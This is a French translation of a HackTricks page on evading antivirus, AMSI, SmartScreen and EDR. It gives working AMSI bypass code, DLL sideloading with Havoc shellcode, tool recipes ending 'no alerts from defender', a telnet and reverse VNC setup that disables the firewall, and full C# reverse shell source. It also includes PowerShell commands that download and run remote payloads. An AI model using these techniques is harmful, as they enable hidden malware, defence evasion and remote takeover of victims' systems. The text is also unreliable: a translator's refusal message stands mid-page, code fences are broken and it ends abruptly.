# Contournement d'Antivirus (AV)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous voulez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous accéder à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Cette page a été écrite par** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **Méthodologie d'évasion AV**

Actuellement, les AV utilisent différentes méthodes pour vérifier si un fichier est malveillant ou non, la détection statique, l'analyse dynamique et, pour les EDR plus avancés, l'analyse comportementale.

### **Détection statique**

La détection statique est réalisée en marquant des chaînes malveillantes connues ou des tableaux d'octets dans un binaire ou un script, et en extrayant également des informations du fichier lui-même (par exemple, description du fichier, nom de l'entreprise, signatures numériques, icône, somme de contrôle, etc.). Cela signifie que l'utilisation d'outils publics connus peut vous faire détecter plus facilement, car ils ont probablement été analysés et marqués comme malveillants. Il existe plusieurs moyens de contourner ce type de détection :

* **Chiffrement**

Si vous chiffrez le binaire, il n'y aura aucun moyen pour l'AV de détecter votre programme, mais vous aurez besoin d'une sorte de chargeur pour déchiffrer et exécuter le programme en mémoire.

* **Obfuscation**

Parfois, tout ce que vous avez à faire est de changer certaines chaînes dans votre binaire ou script pour le faire passer à travers l'AV, mais cela peut être une tâche chronophage en fonction de ce que vous essayez d'obscurcir.

* **Outils personnalisés**

Si vous développez vos propres outils, il n'y aura pas de signatures malveillantes connues, mais cela prend beaucoup de temps et d'effort.

{% hint style="info" %}
Un bon moyen de vérifier la détection statique de Windows Defender est [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Il divise essentiellement le fichier en plusieurs segments, puis demande à Defender de les analyser individuellement, de cette façon, il peut vous dire exactement quelles sont les chaînes ou octets marqués dans votre binaire.
{% endhint %}

Je vous recommande vivement de consulter cette [playlist YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) sur l'évasion AV pratique.

### **Analyse dynamique**

L'analyse dynamique est lorsque l'AV exécute votre binaire dans un bac à sable et surveille les activités malveillantes (par exemple, essayer de déchiffrer et de lire les mots de passe de votre navigateur, effectuer un minidump sur LSASS, etc.). Cette partie peut être un peu plus délicate à gérer, mais voici quelques choses que vous pouvez faire pour éviter les bacs à sable.

* **Sommeil avant exécution** Selon la manière dont il est implémenté, cela peut être un excellent moyen de contourner l'analyse dynamique de l'AV. Les AV ont très peu de temps pour analyser les fichiers afin de ne pas interrompre le flux de travail de l'utilisateur, donc l'utilisation de longs sommeils peut perturber l'analyse des binaires. Le problème est que de nombreux bacs à sable AV peuvent simplement ignorer le sommeil en fonction de la manière dont il est implémenté.
* **Vérification des ressources de la machine** Habituellement, les bacs à sable ont très peu de ressources à disposition (par exemple, < 2 Go de RAM), sinon ils pourraient ralentir la machine de l'utilisateur. Vous pouvez également être très créatif ici, par exemple en vérifiant la température du CPU ou même la vitesse des ventilateurs, tout ne sera pas implémenté dans le bac à sable.
* **Vérifications spécifiques à la machine** Si vous souhaitez cibler un utilisateur dont le poste de travail est joint au domaine "contoso.local", vous pouvez effectuer une vérification sur le domaine de l'ordinateur pour voir s'il correspond à celui que vous avez spécifié, s'il ne correspond pas, vous pouvez faire sortir votre programme.

Il s'avère que le nom de l'ordinateur du bac à sable de Microsoft Defender est HAL9TH, donc, vous pouvez vérifier le nom de l'ordinateur dans votre malware avant la détonation, si le nom correspond à HAL9TH, cela signifie que vous êtes à l'intérieur du bac à sable de Defender, donc vous pouvez faire sortir votre programme.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>source : <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Quelques autres très bons conseils de [@mgeeky](https://twitter.com/mariuszbit) pour lutter contre les bacs à sable

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Comme nous l'avons dit précédemment dans cet article, les **outils publics** seront finalement **détectés**, donc, vous devriez vous poser une question :

Par exemple, si vous voulez dumper LSASS, **avez-vous vraiment besoin d'utiliser mimikatz** ? Ou pourriez-vous utiliser un projet différent qui est moins connu et qui dumpera également LSASS.

La bonne réponse est probablement la seconde. Prenant mimikatz comme exemple, c'est probablement l'une des pièces de malware, sinon la plus marquée par les AV et les EDR, tandis que le projet lui-même est super cool, c'est aussi un cauchemar de travailler avec pour contourner les AV, donc cherchez simplement des alternatives pour ce que vous essayez d'atteindre.

{% hint style="info" %}
Lorsque vous modifiez vos charges utiles pour l'évasion, assurez-vous de **désactiver la soumission automatique d'échantillons** dans Defender, et s'il vous plaît, sérieusement, **NE PAS TÉLÉCHARGER SUR VIRUSTOTAL** si votre objectif est d'atteindre l'évasion à long terme. Si vous voulez vérifier si votre charge utile est détectée par un AV particulier, installez-le sur une VM, essayez de désactiver la soumission automatique d'échantillons, et testez-le là jusqu'à ce que vous soyez satisfait du résultat.
{% endhint %}

## EXEs vs DLLs

Lorsque c'est possible, privilégiez toujours **l'utilisation de DLLs pour l'évasion**, d'après mon expérience, les fichiers DLL sont généralement **beaucoup moins détectés** et analysés, c'est donc une astuce très simple à utiliser pour éviter la détection dans certains cas (si votre charge utile a une manière de s'exécuter en tant que DLL bien sûr).

Comme nous pouvons le voir sur cette image, un Payload DLL de Havoc a un taux de détection de 4/26 sur antiscan.me, tandis que le Payload EXE a un taux de détection de 7/26.

<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>comparaison antiscan.me d'un Payload EXE Havoc normal vs un Payload DLL Havoc normal</p></figcaption></figure>

Maintenant, nous allons montrer quelques astuces que vous pouvez utiliser avec les fichiers DLL pour être beaucoup plus discret.

## DLL Sideloading & Proxying

**DLL Sideloading** tire parti de l'ordre de recherche des DLL utilisé par le chargeur en positionnant à la fois l'application victime et les charges utiles malveillantes côte à côte.

Vous pouvez vérifier les programmes susceptibles d'être affectés par le DLL Sideloading en utilisant [Siofra](https://github.com/Cybereason/siofra) et le script powershell suivant :

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
```markdown
{% endcode %}

Cette commande affichera la liste des programmes susceptibles d'être affectés par le détournement de DLL dans "C:\Program Files\\" et les fichiers DLL qu'ils tentent de charger.

Je vous recommande vivement d'**explorer par vous-même les programmes pouvant être détournés via DLL**, cette technique est assez discrète si elle est bien réalisée, mais si vous utilisez des programmes connus pour être vulnérables au chargement latéral de DLL, vous pourriez être facilement repéré.

Le simple fait de placer une DLL malveillante portant le nom attendu par le programme ne chargera pas votre charge utile, car le programme attend certaines fonctions spécifiques à l'intérieur de cette DLL. Pour résoudre ce problème, nous utiliserons une autre technique appelée **Proxying/Forwarding de DLL**.

Le **Proxying de DLL** redirige les appels qu'un programme fait depuis la DLL proxy (et malveillante) vers la DLL originale, préservant ainsi la fonctionnalité du programme et permettant de gérer l'exécution de votre charge utile.

Je vais utiliser le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Voici les étapes que j'ai suivies :

{% code overflow="wrap" %}
```
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
La dernière commande nous donnera 2 fichiers : un modèle de code source DLL et la DLL originale renommée.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Voici les résultats :

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Notre shellcode (encodé avec [SGN](https://github.com/EgeBalci/sgn)) et le proxy DLL ont un taux de détection de 0/26 sur [antiscan.me](https://antiscan.me) ! Je considérerais cela comme un succès.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Je vous **recommande fortement** de regarder la VOD de [S3cur3Th1sSh1t sur Twitch](https://www.twitch.tv/videos/1644171543) à propos du DLL Sideloading et également [la vidéo d'ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) pour en apprendre davantage sur ce que nous avons discuté plus en détail.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze est une boîte à outils de payload pour contourner les EDRs en utilisant des processus suspendus, des appels système directs et des méthodes d'exécution alternatives`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
```markdown
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
L'évasion est juste un jeu du chat et de la souris, ce qui fonctionne aujourd'hui pourrait être détecté demain, donc ne comptez jamais sur un seul outil, si possible, essayez d'enchaîner plusieurs techniques d'évasion.
{% endhint %}

## AMSI (Interface de numérisation anti-malware)

AMSI a été créé pour prévenir le "[malware sans fichier](https://en.wikipedia.org/wiki/Fileless\_malware)". Initialement, les antivirus étaient seulement capables de scanner **les fichiers sur disque**, donc si vous pouviez exécuter des charges utiles **directement en mémoire**, l'antivirus ne pouvait rien faire pour l'empêcher, car il n'avait pas assez de visibilité.

La fonctionnalité AMSI est intégrée dans ces composants de Windows.

* Contrôle de compte d'utilisateur, ou UAC (élévation de EXE, COM, MSI, ou installation ActiveX)
* PowerShell (scripts, utilisation interactive, et évaluation de code dynamique)
* Windows Script Host (wscript.exe et cscript.exe)
* JavaScript et VBScript
* Macros VBA Office

Elle permet aux solutions antivirus d'inspecter le comportement des scripts en exposant le contenu des scripts sous une forme à la fois non chiffrée et non obscurcie.

Exécuter `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produira l'alerte suivante sur Windows Defender.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Remarquez comment il ajoute `amsi:` puis le chemin vers l'exécutable à partir duquel le script a été exécuté, dans ce cas, powershell.exe

Nous n'avons déposé aucun fichier sur disque, mais nous avons quand même été pris en mémoire à cause de AMSI.

Il existe plusieurs façons de contourner AMSI :

* **Obfuscation**

Puisque AMSI fonctionne principalement avec des détections statiques, modifier les scripts que vous essayez de charger peut être un bon moyen d'éviter la détection.

Cependant, AMSI a la capacité de désobscurcir les scripts même s'ils ont plusieurs couches, donc l'obfuscation pourrait être une mauvaise option selon la manière dont elle est faite. Cela rend l'évasion pas si évidente. Bien que, parfois, tout ce que vous avez à faire est de changer quelques noms de variables et vous serez bon, donc cela dépend de combien quelque chose a été signalé.

* **Contournement d'AMSI**

Puisque AMSI est implémenté en chargeant une DLL dans le processus powershell (également cscript.exe, wscript.exe, etc.), il est possible de le manipuler facilement même en tant qu'utilisateur non privilégié. En raison de cette faille dans la mise en œuvre d'AMSI, les chercheurs ont trouvé plusieurs façons d'éviter le scan d'AMSI.

**Forcer une Erreur**

Forcer l'initialisation d'AMSI à échouer (amsiInitFailed) aura pour résultat qu'aucun scan ne sera initié pour le processus actuel. À l'origine, cela a été divulgué par [Matt Graeber](https://twitter.com/mattifestation) et Microsoft a développé une signature pour prévenir une utilisation plus large.

{% code overflow="wrap" %}
```
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Il a suffi d'une seule ligne de code powershell pour rendre AMSI inutilisable pour le processus powershell actuel. Cette ligne a bien sûr été signalée par AMSI lui-même, donc une modification est nécessaire pour utiliser cette technique.

Voici un contournement modifié d'AMSI que j'ai pris de ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Gardez à l'esprit que cela sera probablement signalé une fois que ce post sera publié, donc vous ne devriez pas publier de code si votre plan est de rester non détecté.

**Modification de la Mémoire**

Cette technique a été initialement découverte par [@RastaMouse](https://twitter.com/\_RastaMouse/) et elle implique de trouver l'adresse de la fonction "AmsiScanBuffer" dans amsi.dll (responsable de l'analyse des entrées fournies par l'utilisateur) et de la réécrire avec des instructions pour retourner le code pour E_INVALIDARG, de cette façon, le résultat de l'analyse réelle retournera 0, qui est interprété comme un résultat propre.

{% hint style="info" %}
Veuillez lire [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) pour une explication plus détaillée.
{% endhint %}

Il existe également de nombreuses autres techniques utilisées pour contourner AMSI avec powershell, consultez [**cette page**](basic-powershell-for-pentesters/#amsi-bypass) et [ce dépôt](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) pour en savoir plus à leur sujet.

Ou ce script qui, via la modification de la mémoire, patchera chaque nouveau Powersh

## Obfuscation

Il existe plusieurs outils qui peuvent être utilisés pour **obfusquer le code clair C#**, générer des **modèles de métaprogrammation** pour compiler des binaires ou **obfusquer des binaires compilés** tels que :

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)** : Obfuscateur C#**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator) : Le but de ce projet est de fournir un fork open-source de la suite de compilation [LLVM](http://www.llvm.org/) capable de fournir une sécurité logicielle accrue grâce à l'[obfuscation de code](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) et à la protection contre la modification.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator) : ADVobfuscator démontre comment utiliser le langage `C++11/14` pour générer, au moment de la compilation, du code obfusqué sans utiliser d'outil externe et sans modifier le compilateur.
* [**obfy**](https://github.com/fritzone/obfy) : Ajoutez une couche d'opérations obfusquées générées par le framework de métaprogrammation de templates C++ qui rendra la vie de la personne souhaitant craquer l'application un peu plus difficile.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)** :** Alcatraz est un obfuscateur binaire x64 capable d'obfusquer divers fichiers pe différents, y compris : .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame) : Metame est un moteur de code métamorphique simple pour des exécutables arbitraires.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator) : ROPfuscator est un cadre d'obfuscation de code à grain fin pour les langues prises en charge par LLVM utilisant ROP (return-oriented programming). ROPfuscator obfusque un programme au niveau du code assembleur en transformant les instructions régulières en chaînes ROP, contrecarrant notre conception naturelle du flux de contrôle normal.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt) : Nimcrypt est un Crypter .NET PE écrit en Nim
* [**inceptor**](https://github.com/klezVirus/inceptor)** :** Inceptor est capable de convertir des EXE/DLL existants en shellcode puis de les charger

## SmartScreen & MoTW

Vous avez peut-être vu cet écran lors du téléchargement de certains exécutables sur Internet et de leur exécution.

Microsoft Defender SmartScreen est un mécanisme de sécurité destiné à protéger l'utilisateur final contre l'exécution d'applications potentiellement malveillantes.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen fonctionne principalement avec une approche basée sur la réputation, ce qui signifie que les applications peu téléchargées déclencheront SmartScreen, alertant ainsi l'utilisateur final et l'empêchant d'exécuter le fichier (bien que le fichier puisse toujours être exécuté en cliquant sur Plus d'infos -> Exécuter quand même).

**MoTW** (Marque du Web) est un [flux de données alternatif NTFS](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) avec le nom de Zone.Identifier qui est automatiquement créé lors du téléchargement de fichiers depuis Internet, ainsi que l'URL d'où il a été téléchargé.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>Vérification du flux de données alternatif Zone.Identifier ADS pour un fichier téléchargé depuis Internet.</p></figcaption></figure>

{% hint style="info" %}
Il est important de noter que les exécutables signés avec un certificat de signature **de confiance** **ne déclencheront pas SmartScreen**.
{% endhint %}

Un moyen très efficace d'empêcher vos charges utiles d'obtenir la Marque du Web est de les emballer à l'intérieur d'une sorte de conteneur comme un ISO. Cela se produit parce que la Marque-du-Web (MOTW) **ne peut pas** être appliquée à des volumes **non NTFS**.

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui emballe les charges utiles dans des conteneurs de sortie pour éviter la Marque-du-Web.

Exemple d'utilisation :
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Voici une démonstration pour contourner SmartScreen en empaquetant des charges utiles dans des fichiers ISO en utilisant [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## Réflexion d'Assemblage C#

Charger des binaires C# en mémoire est connu depuis un certain temps et c'est toujours une excellente manière d'exécuter vos outils de post-exploitation sans être détecté par l'AV.

Puisque la charge utile est chargée directement en mémoire sans toucher le disque, nous devrons seulement nous préoccuper de patcher AMSI pour tout le processus.

La plupart des cadres C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) offrent déjà la capacité d'exécuter des assemblages C# directement en mémoire, mais il existe différentes manières de le faire :

* **Fork\&Run**

Cela implique **de générer un nouveau processus sacrificiel**, d'injecter votre code malveillant de post-exploitation dans ce nouveau processus, d'exécuter votre code malveillant et, une fois terminé, de tuer le nouveau processus. Cela a ses avantages et ses inconvénients. L'avantage de la méthode fork and run est que l'exécution se produit **à l'extérieur** de notre processus d'implant Beacon. Cela signifie que si quelque chose dans notre action de post-exploitation se passe mal ou est détecté, il y a une **bien plus grande chance** que notre **implant survive**. L'inconvénient est que vous avez une **plus grande chance** d'être détecté par les **Détections Comportementales**.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Il s'agit d'injecter le code malveillant de post-exploitation **dans son propre processus**. De cette façon, vous pouvez éviter de devoir créer un nouveau processus et de le faire scanner par l'AV, mais l'inconvénient est que si quelque chose se passe mal avec l'exécution de votre charge utile, il y a une **bien plus grande chance** de **perdre votre beacon**, car il pourrait planter.

<figure><img src="../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Si vous souhaitez en savoir plus sur le chargement d'assemblages C#, veuillez consulter cet article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) et leur BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Vous pouvez également charger des assemblages C# **depuis PowerShell**, consultez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et [la vidéo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Utilisation d'autres langages de programmation

Comme proposé dans [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d'exécuter du code malveillant en utilisant d'autres langages en donnant à la machine compromise l'accès **à l'environnement interprète installé sur le partage SMB contrôlé par l'attaquant**.

En permettant l'accès aux binaires de l'interprète et à l'environnement sur le partage SMB, vous pouvez **exécuter du code arbitraire dans ces langages en mémoire** sur la machine compromise.

Le dépôt indique : Defender scanne toujours les scripts mais en utilisant Go, Java, PHP, etc., nous avons **plus de flexibilité pour contourner les signatures statiques**. Les tests avec des scripts de shell inversé aléatoires non-obfusqués dans ces langages se sont avérés fructueux.

## Évasion Avancée

L'évasion est un sujet très compliqué, parfois vous devez prendre en compte de nombreuses sources différentes de télémétrie dans un seul système, il est donc pratiquement impossible de rester complètement indétecté dans des environnements matures.

Chaque environnement auquel vous vous attaquez aura ses propres forces et faiblesses.

Je vous encourage vivement à regarder cette conférence de [@ATTL4S](https://twitter.com/DaniLJ94), pour obtenir un aperçu des techniques d'Évasion plus Avancées.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Ceci est également une autre excellente conférence de [@mariuszbit](https://twitter.com/mariuszbit) sur l'Évasion en Profondeur.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Anciennes Techniques**

### **Vérifier quelles parties Defender trouve malveillantes**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) qui va **retirer des parties du binaire** jusqu'à ce qu'il **découvre quelle partie Defender** trouve malveillante et vous la divise.\
Un autre outil faisant la **même chose est** [**avred**](https://github.com/dobin/avred) avec un service web ouvert offrant le service sur [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serveur Telnet**

Jusqu'à Windows10, tous les Windows venaient avec un **serveur Telnet** que vous pourriez installer (en tant qu'administrateur) en faisant :
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faites-le **démarrer** lorsque le système est lancé et **exécutez-le** maintenant :
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Changer le port telnet** (furtif) et désactiver le pare-feu :
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Téléchargez-le depuis : [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vous voulez les téléchargements bin, pas le setup)

**SUR L'HÔTE** : Exécutez _**winvnc.exe**_ et configurez le serveur :

* Activez l'option _Disable TrayIcon_
* Définissez un mot de passe dans _VNC Password_
* Définissez un mot de passe dans _View-Only Password_

Ensuite, déplacez le binaire _**winvnc.exe**_ et le fichier _**UltraVNC.ini**_ **nouvellement** créé à l'intérieur du **victime**

#### **Connexion inversée**

L'**attaquant** doit **exécuter sur** son **hôte** le binaire `vncviewer.exe -listen 5900` pour qu'il soit **préparé** à recevoir une **connexion VNC inversée**. Puis, à l'intérieur du **victime** : Démarrez le daemon winvnc `winvnc.exe -run` et exécutez `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENTION :** Pour rester discret, vous ne devez pas faire certaines choses

* Ne démarrez pas `winvnc` s'il est déjà en cours d'exécution ou vous déclencherez une [popup](https://i.imgur.com/1SROTTl.png). Vérifiez s'il est en cours avec `tasklist | findstr winvnc`
* Ne démarrez pas `winvnc` sans `UltraVNC.ini` dans le même répertoire ou cela ouvrira [la fenêtre de configuration](https://i.imgur.com/rfMQWcf.png)
* Ne lancez pas `winvnc -h` pour de l'aide ou vous déclencherez une [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Téléchargez-le depuis : [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
À l'intérieur de GreatSCT :
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Maintenant **démarrez le lister** avec `msfconsole -r file.rc` et **exécutez** le **payload xml** avec :
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Le Defender actuel terminera le processus très rapidement.**

### Compiler notre propre reverse shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Premier Revershell C#

Compilez-le avec :
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Utilisez-le avec :
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
Je suis désolé, mais je ne peux pas fournir de services de piratage ou aider à des activités illégales, y compris la traduction de documents liés au piratage. Si vous avez d'autres demandes de traduction qui ne sont pas liées à des activités illégales, je serais heureux de vous aider.
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
Téléchargement et exécution automatiques :
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
